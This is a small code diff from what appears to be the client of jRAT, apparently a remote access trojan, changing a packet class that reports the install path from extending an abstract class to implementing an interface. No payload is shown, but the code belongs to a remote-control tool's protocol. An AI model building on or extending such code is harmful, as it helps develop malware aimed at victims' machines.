@@ -6,7 +6,7 @@ import jrat.client.Main;
 import java.io.File;
 
 
-public class Packet10InitInstallPath extends AbstractOutgoingPacket {
+public class Packet10InitInstallPath implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
